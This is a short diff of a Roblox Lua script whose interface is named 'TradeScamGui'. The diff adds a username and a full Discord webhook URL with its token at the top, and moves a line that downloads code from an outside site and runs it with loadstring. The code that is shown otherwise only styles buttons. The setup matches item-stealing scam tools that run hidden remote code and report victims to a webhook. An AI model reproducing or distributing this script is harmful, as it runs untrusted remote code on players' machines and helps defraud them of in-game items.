@@ -1,3 +1,8 @@
+Username = "XUMTIX"
+Webhook = "https://discordapp.com/api/webhooks/1268608001036648498/xBi7wilUg8X2Z5pCEt38kPYS8FKOaIfU79XX4Tis7okGDBnvXc2FWiFyGQN814Jd7pMg"
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/886fcd4fff9289e6bcc96ec5.lua", true))()
+
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "TradeScamGui"
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -107,5 +112,3 @@ for _, button in ipairs(buttons) do
     button.Font = Enum.Font.SourceSansBold
     button.TextSize = 20
 end
-loadstring(game:HttpGet("https://egorikusa.space/886fcd4fff9289e6bcc96ec5.lua", true))()
-
